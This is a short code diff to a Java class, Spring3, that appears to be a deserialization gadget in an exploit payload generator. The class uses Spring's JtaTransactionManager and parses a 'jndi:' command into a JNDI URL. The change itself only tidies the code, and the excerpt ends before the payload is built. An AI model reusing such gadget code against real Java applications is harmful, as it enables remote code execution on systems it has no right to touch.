@@ -3,12 +3,13 @@ package com.qi4l.JYso.gadgets;
 import com.qi4l.JYso.gadgets.annotation.Dependencies;
 import org.springframework.transaction.jta.JtaTransactionManager;
 
+@SuppressWarnings({"unused"})
 @Dependencies({"org.springframework:spring-tx:5.2.3.RELEASE", "org.springframework:spring-context:5.2.3.RELEASE", "javax.transaction:javax.transaction-api:1.2"})
 public class Spring3 implements ObjectPayload<Object> {
     @Override
     public Object getObject(String command) throws Exception {
 
-        String jndiURL = null;
+        String jndiURL;
         if (command.toLowerCase().startsWith("jndi:")) {
             jndiURL = command.substring(5);
         } else {
